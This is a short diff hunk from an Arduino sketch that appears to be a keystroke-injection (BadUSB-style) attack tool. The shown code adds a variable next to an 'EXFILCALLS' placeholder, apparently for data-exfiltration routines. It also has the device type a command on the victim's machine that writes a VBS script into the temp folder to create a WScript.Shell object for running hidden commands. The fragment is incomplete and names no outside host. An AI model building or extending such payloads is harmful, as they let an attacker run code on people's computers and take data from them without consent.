@@ -24,6 +24,7 @@ void setup(){
   
 
   String fn = "wl";
+  String fp;
   EXFILCALLS
 
   Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\wl.vbs");
